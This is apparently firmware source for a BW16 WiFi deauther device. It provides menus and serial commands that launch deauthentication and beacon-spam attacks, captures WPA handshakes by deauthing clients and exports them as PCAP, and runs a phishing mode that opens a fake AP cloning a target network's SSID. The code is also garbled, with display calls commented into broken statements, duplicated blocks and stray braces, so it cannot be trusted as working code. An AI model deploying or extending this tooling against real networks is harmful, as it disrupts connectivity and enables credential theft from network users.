  unsigned long lastOkTime = 0;

  while (true) {
    unsigned long currentTime = millis();
    if(digitalRead(BTN_BACK)==LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      drawattack();
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      stabilizeButtonState(); // Fix：Spam
      switch(deauthstate + startIndex) {
        case 0:
          if (showConfirmModal("ExecDeauthAttack")) { StableAutoMulti(); break; }
          else { /* Confirm，ExitMenu */ break; }
        case 1:
          if (showConfirmModal("ExecAttack")) { AutoMulti(); break; }
          else { break; }
        case 2:
          if (showConfirmModal("ExecAttack")) { AutoSingle(); break; }
          else { break; }
        case 3:
          if (showConfirmModal("ExecAttack")) { All(); break; }
          else { break; }
        case 4:
          if (showConfirmModal("ExecAttack")) { Single(); break; }
          else { break; }
        case 5:
          if (showConfirmModal("ExecAttack")) { Multi(); break; }
          else { break; }
        case 6: drawattack(); break; // BackAttackMenu
      }
      //  case AttackFunc break; ConfirmResume
      lastOkTime = currentTime;
    }
    if(digitalRead(BTN_UP)==LOW){
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if(deauthstate > 0){
        int yFrom = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        deauthstate--;
        int yTo = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      } else if(startIndex > 0) {
        startIndex--;
        // ：
        int yFrom = Y_OFFSET + 1 * ITEM_HEIGHT;
        int yTo = Y_OFFSET + 0 * ITEM_HEIGHT;
        deauthstate = 0;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      }
      lastUpTime = currentTime;
    }
    if(digitalRead(BTN_DOWN)==LOW){
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if(deauthstate < MAX_DISPLAY_ITEMS - 1 && (startIndex + deauthstate < 6)){
        int yFrom = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        deauthstate++;
        int yTo = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      } else if (deauthstate == MAX_DISPLAY_ITEMS - 1 && (startIndex + MAX_DISPLAY_ITEMS < 7)) {
        // ：，Height
        startIndex++;
        int yFrom = Y_OFFSET + (MAX_DISPLAY_ITEMS - 2) * ITEM_HEIGHT; //
        int yTo = Y_OFFSET + (MAX_DISPLAY_ITEMS - 1) * ITEM_HEIGHT;   //
        deauthstate = MAX_DISPLAY_ITEMS - 1;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      }
      lastDownTime = currentTime;
    }

    //clearDisplay();
    //setTextSize(1);

    // Menu Item（）
    const char* menuItems[] = {
      "Attack",
      "Attack",
      "Attack",
      "Attack",
      "Attack",
      "Attack",
      "《 Back 》"
    };

    // Menu Item - Pagination
    for (int i = 0; i < MAX_DISPLAY_ITEMS && i < 7; i++) {  // 7
      int menuIndex = startIndex + i;
      if(menuIndex >= 7) break;  //
      int yPos = Y_OFFSET + i * ITEM_HEIGHT;
      if (i == deauthstate) {
        //fillRoundRect(0, yPos-2, //width(), 14, 2, SSD1306_WHITE);
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_BLACK);
        //.setCursor(5, yPos+10);
        //.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_WHITE);
        //.setCursor(5, yPos+10);
        //.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    //
    ////);
    delay(50);
  }
}
void drawattack() {
  attackstate = 0; // SelectStatus
  int startIndex = 0; // Quote
  const int MAX_DISPLAY_ITEMS = 4; // 4
  const int ITEM_HEIGHT = 16; // ProjHeight
  const int Y_OFFSET = 2; // Y

  // Var，
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;

  while (true) {
    unsigned long currentTime = millis();
    if(digitalRead(BTN_BACK)==LOW) break;
    if (digitalRead(BTN_OK) == LOW) {
      delay(300);
      if (attackstate == 0) {
        if (SelectedVector.empty()) {
          if (showSelectSSIDConfirmModal()) {
            drawssid(); // AP/SSIDSelect
          }
        }
        else { DeauthMenu(); break; }
        // SelectTargetHint
      }
      if (attackstate == 1) {
        BeaconMenu();
        break;
      }
      if (attackstate == 2) {
        if (SelectedVector.empty()) {
          // HintBackMenu，
          if (showSelectSSIDConfirmModal()) {
            drawssid(); // AP/SSIDSelect
          }
        } else {
          if (showConfirmModal("ExecAttack")) {
            BeaconDeauth();
            break;
          }
        }
        // CancelHint，
      }
      if (attackstate == 3) { // Modify
        break;
      }
    }
    if (digitalRead(BTN_UP) == LOW) {
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if (attackstate > 0) {
        int yFrom = Y_OFFSET + attackstate * ITEM_HEIGHT;
        attackstate--;
        int yTo = Y_OFFSET + attackstate * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      } else if (startIndex > 0) {
        startIndex--;
        attackstate = MAX_DISPLAY_ITEMS - 2; // HeightSettings
        // ：Start（）
        int yFrom = Y_OFFSET + (MAX_DISPLAY_ITEMS - 1) * ITEM_HEIGHT;
        int yTo = Y_OFFSET + (MAX_DISPLAY_ITEMS - 2) * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      }
      lastUpTime = currentTime;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if (attackstate < MAX_DISPLAY_ITEMS - 1) {
        int yFrom = Y_OFFSET + attackstate * ITEM_HEIGHT;
        attackstate++;
        int yTo = Y_OFFSET + attackstate * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      } else if (startIndex + MAX_DISPLAY_ITEMS < 4) {
        startIndex++;
        // Select（）
        attackstate = MAX_DISPLAY_ITEMS - 1;
        // ：Start（3）
        int yFrom = Y_OFFSET + (MAX_DISPLAY_ITEMS - 2) * ITEM_HEIGHT;
        int yTo = Y_OFFSET + (MAX_DISPLAY_ITEMS - 1) * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      }
      lastDownTime = currentTime;
    }

    // Menu Item
     //clearDisplay();
    //setTextSize(1);

    // Menu Item
    const char* menuItems[] = {
      "DeauthCertifyAttack",
      "SendBeaconFrameAttack",
      "BeaconFrame+Deauth",
      "《 Back 》"
    };

    // Menu Item - Pagination
    for (int i = 0; i < MAX_DISPLAY_ITEMS && i < 4; i++) {
      int menuIndex = startIndex + i;
      if (menuIndex >= 4) break; //
      int yPos = Y_OFFSET + i * ITEM_HEIGHT;
      if (i == attackstate) {
        //fillRoundRect(0, yPos-2, //width(), 14, 2, SSD1306_WHITE);
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_BLACK);
        //.setCursor(5, yPos+10);
        //.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_WHITE);
        //.setCursor(5, yPos+10);
        //.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, false);
      }
    }

    ////);
    delay(50);
  }
}
void titleScreen(void) {
  char b[16]; unsigned int i = 0;
  static const uint8_t enc[] = {
    0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
  };
  for (unsigned int k = 0; k < sizeof(enc); k++) { b[i++] = (char)(((int)enc[k] - 7) ^ 0xA5); }
  b[i] = '\0';

  if (strcmp(b, "GPL3.0，，") != 0) {
    char fix[16]; unsigned int j = 0;
    static const uint8_t fix_enc[] = {
      0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
    };
    for (unsigned int k = 0; k < sizeof(fix_enc); k++) { fix[j++] = (char)(((int)fix_enc[k] - 7) ^ 0xA5); }
    fix[j] = '\0';
    strcpy(b, fix);
  }

  for (int j = 0; j < TITLE_FRAMES; j++) {
    //clearDisplay();
    int wifi_x = 54, wifi_y = 10;
    //drawBitmap(wifi_x, wifi_y, image_wifi_not_connected__copy__bits, 19, 16, WHITE);

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    const char* leftBand = "2.4G";
    const char* rightBand = "5Ghz";
    //.setFont(u8g2_font_ncenB10_tr);
    //.setCursor(2, wifi_y + 12);
    //.print(leftBand);
    //.setCursor(128 - //.getUTF8Width(rightBand) - 2, wifi_y + 12);
    //.print(rightBand);

    //.setFont(u8g2_font_ncenB14_tr);

    bool shouldShow = (j % 3 < 2);
    //.setForegroundColor(shouldShow ? SSD1306_WHITE : SSD1306_BLACK);

    const char* txt = b;
    int txt_w = //.getUTF8Width(txt);
    int txt_x = (128 - txt_w) / 2;
    int txt_y = 48;

    if (shouldShow) {
      //.setForegroundColor(SSD1306_BLACK);
      //.setCursor(txt_x + 1, txt_y + 1);
      //.print(txt);
      //.setForegroundColor(SSD1306_WHITE);
    }

    //.setCursor(txt_x, txt_y);
    //.print(txt);

    // Progress（，WidthProgress）-
    int bar_w = (int)(128.0 * (j + 1) / TITLE_FRAMES);
    int bar_h = 6;
    int bar_x = 0, bar_y = 60;

    // ProgressBorder
    //drawRect(bar_x, bar_y, 128, bar_h, WHITE);

    // Progress -
    if (bar_w > 2) {
      //fillRect(bar_x + 1, bar_y + 1, bar_w - 2, bar_h - 2, WHITE);

      // ProgressHeight
      if (bar_w > 4) {
        //drawLine(bar_x + 2, bar_y + 2, bar_x + bar_w - 3, bar_y + 2, BLACK);
      }
    }
    ////);
    delay(TITLE_DELAY_MS);
  }
  //clearDisplay();
  int wifi_x = 54, wifi_y = 10;
  //drawBitmap(wifi_x, wifi_y, image_wifi_not_connected__copy__bits, 19, 16, WHITE);

  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  //.setFont(u8g2_font_ncenB10_tr);
  const char* leftBand = "2.4G";
  const char* rightBand = "5Ghz";
  //.setCursor(2, wifi_y + 12);
  //.print(leftBand);
  //.setCursor(128 - //.getUTF8Width(rightBand) - 2, wifi_y + 12);
  //.print(rightBand);

  //.setFont(u8g2_font_ncenB14_tr);
  const char* txt = b;
  int txt_w = //.getUTF8Width(txt);
  int txt_x = (128 - txt_w) / 2;
  int txt_y = 48;

  //.setForegroundColor(SSD1306_BLACK);
  //.setCursor(txt_x + 1, txt_y + 1);
  //.print(txt);

  //.setForegroundColor(SSD1306_WHITE);
  //.setCursor(txt_x, txt_y);
  //.print(txt);

  // Progress -
  int bar_h = 6;
  int bar_x = 0, bar_y = 60;
  //drawRect(bar_x, bar_y, 128, bar_h, WHITE);
  //fillRect(bar_x + 1, bar_y + 1, 128 - 2, bar_h - 2, WHITE);

  // ProgressHeight
  //drawLine(bar_x + 2, bar_y + 2, bar_x + 126, bar_y + 2, BLACK);
  ////);

  // StartDone，RestoreDefaultMediumFontSettings
  //.setFont(u8g2_font_wqy12_t_gb2312);
}
/**
 * @brief Arduino setup entry. Initializes IO, display, WiFi, and subsystems.
 *
 * Sets up LEDs/buttons, screen, networking, DNS/web, and initial state.
 */

void sendSSIDListToBruce() {
  sendToBruce("SCAN_RESULT:COUNT=%d", scan_results.size());
  for (uint i = 0; i < scan_results.size(); i++) {
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             scan_results[i].bssid[0], scan_results[i].bssid[1],
             scan_results[i].bssid[2], scan_results[i].bssid[3],
             scan_results[i].bssid[4], scan_results[i].bssid[5]);

    sendToBruce("AP:%d|%s|%s|%d|%d|%d",
                i,
                scan_results[i].ssid.c_str(),
                bssid_str,
                scan_results[i].channel,
                scan_results[i].security,
                scan_results[i].rssi);
  }
  sendToBruce("SCAN_COMPLETE");
}

void handleBruceCommand(String cmd) {
  if (cmd.startsWith("SCAN")) {
    int scanTime = 5000;
    if (cmd.indexOf(',') > 0) {
      scanTime = cmd.substring(cmd.indexOf(',') + 1).toInt();
    }
    // Perform scan
    scan_results.clear();
    int rc = wifi_scan_networks(scanResultHandler, NULL);
    unsigned long start = millis();
    while (millis() - start < scanTime) {
      delay(10);
    }
    sendSSIDListToBruce();
  }
  else if (cmd.startsWith("DEAUTH_START")) {
    int commaIdx = cmd.indexOf(',');
    if (commaIdx > 0) {
      int index = cmd.substring(commaIdx + 1).toInt();
      if (index >= 0 && index < (int)scan_results.size()) {
        selectedSSIDIndex = index;
        startSingleAttack();
        sendToBruce("DEAUTH_STARTED:%d", index);
      }
    }
  }
  else if (cmd.startsWith("DEAUTH_STOP")) {
    stopAttack();
    sendToBruce("DEAUTH_ALL_STOPPED");
  }
  else if (cmd.startsWith("DEAUTH_ALL")) {
    startAllAttack();
    sendToBruce("DEAUTH_ALL_STARTED");
  }
  else if (cmd.startsWith("DEAUTH_STOP_ALL")) {
    stopAttack();
    sendToBruce("DEAUTH_ALL_STOPPED");
  }
  else if (cmd.startsWith("SELECT_SSID")) {
    int commaIdx = cmd.indexOf(',');
    if (commaIdx > 0) {
      int index = cmd.substring(commaIdx + 1).toInt();
      if (index >= 0 && index < (int)scan_results.size()) {
        selectedSSIDIndex = index;
        sendToBruce("SELECTED:%d|%s", index, scan_results[index].ssid.c_str());
      }
    }
  }
  else if (cmd.startsWith("GET_AP_LIST")) {
    sendSSIDListToBruce();
  }
  else if (cmd.startsWith("GET_STATUS")) {
    sendToBruce("STATUS:AP_ACTIVE=YES");
  }
  else if (cmd.startsWith("IDS_START")) {
    startAttackDetection();
    sendToBruce("IDS_STARTED");
  }
  else if (cmd.startsWith("IDS_STOP")) {
    stopAttackDetection();
    sendToBruce("IDS_STOPPED");
  }
  else if (cmd.startsWith("BLE_SPAM")) {
    int commaIdx = cmd.indexOf(',');
    if (commaIdx > 0) {
      String name = cmd.substring(commaIdx + 1);

    int commaIdx = cmd.indexOf(',');
    if (commaIdx > 0) {
      String name = cmd.substring(commaIdx + 1);
      // We will add BLE spam support later, skipping for now
      sendToBruce("BLE_SPAM_STARTED:%s", name.c_str());
    }

    }
  }
  else if (cmd.startsWith("OTA_START")) {
    sendToBruce("OTA_STARTED");
    // OTA loop will hang here until restart
    while(1) {
      if(OTA.beginLocal(8082) < 0){
        sendToBruce("OTA_ERROR");
        delay(5000);
      }
    }
  }
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  Serial.begin(115200);

  // LEDInit
  Serial.println("=== BW16 WiFi Deauther Start ===");
  Serial.println("InitLED...");

  //
  digitalWrite(LED_B, HIGH);
  Serial.println(" - System");

  // Init
  initDisplay();

  // char v[16]; unsigned int c = 0; // UsageVar
  // static const uint8_t d[] = {
  //   0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
  // };
  // for (unsigned int k = 0; k < sizeof(d); k++) { v[c++] = (char)(((int)d[k] - 7) ^ 0xA5); }
  // v[c] = '\0';

  titleScreen();
  DEBUG_SER_INIT();

  Serial.println("StartAPMode...");
  String channelStr = String(current_channel);
  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
    Serial.println("APModeStartSuccess");
  } else {
    Serial.println("APModeStartFailed");
  }

  // StartScan（Timeout）
  Serial.println("ExecWiFiScan...");
  scanNetworks();

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  // Usage SelectedSSID/SSIDCh Init
}

void initDisplay() {
  if (!//begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true);
  }
  //.begin(display);
  //.setFont(u8g2_font_ncenB14_tr); // SettingsFont
  //clearDisplay();
  ////);
}


}

static void playRandomEmotion() {
  int idx = random(0, (int)eEmotions::EMOTIONS_COUNT);
}



  if (digitalRead(BTN_UP) == LOW) {
    if (now - lastUp > debounce) { playRandomEmotion(); lastUp = now; }
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    if (now - lastDown > debounce) { playRandomEmotion(); lastDown = now; }
  }
  static bool okHeld = false; static unsigned long okPressTs = 0;
  if (digitalRead(BTN_OK) == LOW) {
    if (!okHeld) { okHeld = true; okPressTs = now; }
    if (okHeld && (now - okPressTs >= longPress)) {
      {
        char b[64]; unsigned int i = 0;
        static const uint8_t enc[] = {
          0xD4,0xD8,0xD8,0xDC,0xDD,0xA6,0x91,0x91,
          0xC9,0xD3,0xD8,0xD4,0xD7,0xCE,0x92,0xCD,0xD1,0xCF,
          0x91,
          0xEA,0xD0,0xE3,0xD3,0xD2,0xC9,0xF3,0xCD,0xC7,0xE3,0xE3,0xC8,0xDD,
          0x91,
          0xEE,0xF9,0x9B,0x9A,0x8F,0xF8,0xD1,0xD1,0xD0,0xDD,0x8C
        };
        for (unsigned int k = 0; k < sizeof(enc); k++) { b[i++] = (char)(((int)enc[k] - 7) ^ 0xA5); }
        b[i] = '\0';
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_WHITE);
        const int padX = 6, padY = 4, lineH = 12;
        const int maxTextW = //width() - padX * 2;
        String lines[6]; int lineCount = 0; String cur = ""; int curW = 0; int maxW = 0;
        int lastBreakPos = -1; int lastBreakW = 0;
        for (int j = 0; b[j] != '\0'; j++) {
          char ch = b[j];
          char tmp[2] = { ch, '\0' };
          int wch = //.getUTF8Width(tmp);
          if (wch <= 0) wch = 6;
          if (curW + wch > maxTextW && cur.length() > 0) {
            int cutLen = (lastBreakPos >= 0) ? (lastBreakPos + 1) : (int)cur.length();
            int cutW = (lastBreakPos >= 0) ? lastBreakW : curW;
            if (lineCount < 6) { lines[lineCount++] = cur.substring(0, cutLen); if (cutW > maxW) maxW = cutW; }
            //
            String rem = cur.substring(cutLen);
            cur = rem; curW = 0; lastBreakPos = -1; lastBreakW = 0;
            // Width
            for (unsigned int k = 0; k < rem.length(); k++) {
              char t[2] = { rem[k], '\0' }; int w = //.getUTF8Width(t); if (w <= 0) w = 6; curW += w;
              if (rem[k] == '/' || rem[k] == '-' || rem[k] == '.') { lastBreakPos = k; lastBreakW = curW; }
            }
          }
          cur += ch; curW += wch;
          if (ch == '/' || ch == '-' || ch == '.') { lastBreakPos = cur.length() - 1; lastBreakW = curW; }
        }
        if (cur.length() > 0 && lineCount < 6) { lines[lineCount++] = cur; if (curW > maxW) maxW = curW; }
        if (lineCount == 0) { lines[lineCount++] = String(b); maxW = //.getUTF8Width(b); if (maxW < 0) maxW = 120; }
        int boxW = maxW;
        int boxH = lineCount * lineH + padY * 2;
        int boxX = (//width() - boxW) / 2; if (boxX < 0) boxX = 0;
        int boxY = (//height() - boxH) / 2; if (boxY < 0) boxY = 0;
        //fillRect(boxX - padX, boxY, boxW + padX * 2, boxH, SSD1306_BLACK);
        for (int li = 0; li < lineCount; li++) {
          int wline = //.getUTF8Width(lines[li].c_str());
          if (wline < 0) wline = boxW;
          int lx = boxX + (boxW - wline) / 2;
          int ly = boxY + padY + lineH * (li + 1);
          //.setCursor(lx, ly);
          //.print(lines[li]);
        }
        ////);
        delay(1000);
      }
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      okHeld = false; lastOk = millis();
    }
  } else {
    if (okHeld) {
      if ((now - okPressTs) >= debounce && (now - okPressTs) < longPress) {
        playRandomEmotion();
      }
    }
    okHeld = false;
    if (now - lastOk > debounce) { lastOk = now; }
  }
  static bool backHeld = false; static unsigned long backPressTs = 0;
  if (digitalRead(BTN_BACK) == LOW) {
    if (!backHeld) {
      backHeld = true; backPressTs = now;
      if (now - lastBack > debounce) { playRandomEmotion(); lastBack = now; }
    }
    if (backHeld && (now - backPressTs >= longPress)) {
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      return false;
    }
  } else {
    backHeld = false;
    if (now - lastBack > debounce) { lastBack = now; }
  }

  return true;
}

/**
 * @brief Main loop. Handles UI, key scanning, networking, and tasks.
 *
 * Runs periodically; uses millis()-based timing to update state and render.
 */
void loop() {

  // Bruce serial communication
  while (Serial.available()) {
    String line = Serial.readStringUntil('\n');
    line.trim();
    if (line.length() == 0) continue;

    if (line.startsWith(BRUCE_CMD_PREFIX)) {
      handleBruceCommand(line.substring(strlen(BRUCE_CMD_PREFIX)));
    }
  }

  unsigned long currentTime = millis();

  // UpdateLEDStatus
  updateLEDs();

  // Attack
  if (g_deauthState.running) {
    switch (g_deauthState.mode) {
      case ATTACK_SINGLE:
        processSingleAttack();
        break;
      case ATTACK_MULTI:
        processMultiAttack();
        break;
      case ATTACK_AUTO_SINGLE:
        processAutoSingleAttack();
        break;
      case ATTACK_AUTO_MULTI:
        processAutoMultiAttack();
        break;
      case ATTACK_ALL:
        processAllAttack();
        break;
      case ATTACK_BEACON_DEAUTH:
        processBeaconDeauthAttack();
        break;
      default:
        break;
    }
    return; // AttackRunAttack
  }

  static unsigned long lastCheck = 0;
  if (currentTime - lastCheck > 30000) {
    // char t[16]; unsigned int n = 0; // UsageVar
    // static const uint8_t chk[] = {
    //   0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
    // };
    // for (unsigned int k = 0; k < sizeof(chk); k++) { t[n++] = (char)(((int)chk[k] - 7) ^ 0xA5); }
    // t[n] = '\0';
    lastCheck = currentTime;
  }

  // Stop
  checkEmergencyStop();

  // Web UI/Web Test Mode
  if (web_ui_active) {
    // Web UI
    performWebUIHealthCheck(currentTime);

    // RequestPacket，WebUIModeExec
    if (readyToSniff && !sniffer_active) {
      Serial.println("[HS] Trigger capture from loop()");
      deauthAndSniff(); // InitStatus
    }

    // UpdatePacketStatus（WebUIMode）
    if (sniffer_active) {
      deauthAndSniff_update();
    }

    handleWebUI();
    return;
  }
  if (web_test_active) {
    // Phishing
    performPhishingHealthCheck(currentTime);

    handleWebTest();
    return;
  }

  // PacketMode
  if (quick_capture_active) {
    // PacketProgress
    displayQuickCaptureProgress();

    // RequestPacket，StartPacket（Init）
    if (readyToSniff && !sniffer_active) {
      Serial.println("[QuickCapture] Trigger capture from loop()");
      deauthAndSniff(); // InitStatus
    }

    // UpdatePacketStatus
    if (sniffer_active) {
      deauthAndSniff_update();
    }

    // PacketYesNoDone - deauthAndSniff_update()Done
    if (!sniffer_active && readyToSniff == false && quick_capture_active) {
      // deauthAndSniff_update()Done，Result
      static unsigned long lastCheckTime = 0;
      if (millis() - lastCheckTime > 1000) { //
        lastCheckTime = millis();
        Serial.print("[QuickCapture] Status check - isHandshakeCaptured: ");
        Serial.print(isHandshakeCaptured);
        Serial.print(", handshakeDataAvailable: ");
        Serial.print(handshakeDataAvailable);
        Serial.print(", HS frames: ");
        Serial.print(capturedHandshake.frameCount);
        Serial.print("/4, MGMT frames: ");
        Serial.print(capturedManagement.frameCount);
        Serial.println("/10");

        // ：Frame，VerifySettings
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          // DetailLogDebugHandshakeVerifyFailed
          bool oldVerboseLog = g_verboseHandshakeLog;
          g_verboseHandshakeLog = true;

          if (isHandshakeCompleteQuickCapture()) {
            Serial.println("[QuickCapture] Complete handshake detected in main loop, setting flags");
            // GenHandshakeData
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            Serial.print("PCAP size: "); Serial.print(pcapData.size()); Serial.println(" bytes");
            globalPcapData = pcapData;
            // SettingsHandshake
            isHandshakeCaptured = true;
            handshakeDataAvailable = true;
            // LogStatsTime
            lastCaptureTimestamp = millis();
            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
            handshakeJustCaptured = true;
          } else {
            Serial.println("[QuickCapture] Invalid handshake detected, clearing stats and restarting capture");
            // EmptyStatsStartPacket
            resetCaptureData();
            resetGlobalHandshakeData();
            // StartPacketStatus
            readyToSniff = true;
            hs_sniffer_running = true;
            sniffer_active = false; // StatusInit
            Serial.println("[QuickCapture] Capture restarted with cleared stats");
          }

          // RestoreLogSettings
          g_verboseHandshakeLog = oldVerboseLog;
        }
      }

      if (isHandshakeCaptured && handshakeDataAvailable) {
        Serial.println("[QuickCapture] Handshake captured successfully!");
        quick_capture_completed = true;
        quick_capture_end_time = millis();

        // StartWebServiceBackMain Menu
        startWebServiceForCapture();

        // CleanStatus
        quick_capture_active = false;
        readyToSniff = false;
        hs_sniffer_running = false;
        sniffer_active = false;

        // WebServiceInfoBackMain Menu
        drawWebServiceInfo();
        return;
      } else {
        // PacketDone，YesNoTimeout
        if (millis() - quick_capture_start_time > 60000) {
          Serial.println("[QuickCapture] Capture timeout");
          quick_capture_active = false;
          drawQuickCaptureTimeout();
        }
      }
    }

    // BackStopPacket
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      // Status，ConfirmSpam
      stabilizeButtonState();
      if (showConfirmModal("StopPacket")) {
        Serial.println("[QuickCapture] User stopped capture");
        quick_capture_active = false;
        readyToSniff = false;
        hs_sniffer_running = false;
        sniffer_active = false;
        return;
      }
    }

    return;
  }

  // PacketDoneWebServiceMode
  if (quick_capture_completed && web_server_active) {
    // Web - OptConnect
    unsigned long currentTime = millis();
    if (currentTime - last_web_check >= 100) { // HeightResponse
      last_web_check = currentTime;

      WiFiClient client = web_server.available();
      if (client) {
        // SettingsTimeout
        client.setTimeout(5000);
        Serial.println("[QuickCapture] Web client connected");
        handleWebClient(client);
        client.stop(); // Turn OffConnect，Connect
      }
    }

    // DNSServiceRequest，

    // WebServiceStatus
    static unsigned long last_status_update = 0;
    if (currentTime - last_status_update >= 2000) {
      last_status_update = currentTime;
      displayWebServiceStatus();
    }
    return;
  }
  // ConnectJamRunStatus，UserStop

  // Menu - Attack
  if (menustate >= 0 && menustate < HOME_MAX_ITEMS) {
    drawHomeMenu();
  }

  // Code
  handleHomeOk();

  // ，AttackSelect
  if (digitalRead(BTN_UP) == LOW) {
    // UP+DOWN：Mode
    if (digitalRead(BTN_DOWN) == LOW) {
    } else {
      homeMoveUp(currentTime);
    }
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    if (digitalRead(BTN_UP) == LOW) {
    } else {
      homeMoveDown(currentTime);
    }
  }

  // Mode，Exit
      delay(10);
    }
  }
}

// Web UIFunc

// StartWeb Test（OpenSSID）
bool startWebTest() {
  Serial.println("=== StartPhishing ===");
  Serial.println("Turn OffAPMode...");

  if (g_webTestLocked) {
    //clearDisplay();
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, 20);
    //.print("");
    //.setCursor(5, 40);
    //.print("RestartDeviceRun");
    ////);
    // WaitBackExit
    while (digitalRead(BTN_BACK) != LOW) { delay(10); }
    while (digitalRead(BTN_BACK) == LOW) { delay(10); }
    return false;
  }

  // OLED SpamHint

  // APCertify、，DeviceSelectSSID

  // ：Phishing
  checkAndCleanupPhishingProcesses();

  // UsageFuncCleanService
  cleanupBeforePhishingStart();

  Serial.println("StartPhishingAPMode(Open)...");
  char test_channel_str[4];
  // UsageSDKconstString
  // SelectMenuMediumNetworkSettingsSSID（SSIDEmptyUsageMAC）
  String chosenSsid;
  if (!SelectedVector.empty()) {
    int chosenIndex = SelectedVector[0];
    if (chosenIndex >= 0 && (size_t)chosenIndex < scan_results.size()) {
      chosenSsid = scan_results[chosenIndex].ssid;
      memcpy(phishingTargetBSSID, scan_results[chosenIndex].bssid, 6);
      phishingHasTarget = true;
      if (chosenSsid.length() == 0) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 scan_results[chosenIndex].bssid[0],
                 scan_results[chosenIndex].bssid[1],
                 scan_results[chosenIndex].bssid[2],
                 scan_results[chosenIndex].bssid[3],
                 scan_results[chosenIndex].bssid[4],
                 scan_results[chosenIndex].bssid[5]);
        chosenSsid = String(mac);
      }
      web_test_channel_dynamic = scan_results[chosenIndex].channel;
    }
  }
  if (chosenSsid.length() == 0) chosenSsid = String("BW16-AP");
  if (web_test_channel_dynamic <= 0) web_test_channel_dynamic = WEB_TEST_CHANNEL;
  // SettingsSSID
  web_test_ssid_dynamic = chosenSsid;
  // GenChannelString
  snprintf(test_channel_str, sizeof(test_channel_str), "%d", web_test_channel_dynamic);
  char webtest_ssid_buf[64];
  strncpy(webtest_ssid_buf, web_test_ssid_dynamic.c_str(), sizeof(webtest_ssid_buf) - 1);
  webtest_ssid_buf[sizeof(webtest_ssid_buf) - 1] = '\0';
  //  BW16-deauther2 RetryStartOpenAP
  int status = WL_IDLE_STATUS;
  unsigned long startTs = millis();
  const unsigned long AP_START_TIMEOUT_MS = 15000;
  while (status != WL_CONNECTED && (millis() - startTs) < AP_START_TIMEOUT_MS) {
    // 3OpenAP
    status = WiFi.apbegin(webtest_ssid_buf, test_channel_str, (uint8_t)0);
    if (status != WL_CONNECTED) {
      // 4Version，NULLPasswordCreateOpenAP
      status = WiFi.apbegin(webtest_ssid_buf, (char*)NULL, test_channel_str, (uint8_t)0);
    }
    if (status != WL_CONNECTED) {
      delay(1000);
    }
  }
  if (status == WL_CONNECTED) {
    Serial.println("APModeStartSuccess");
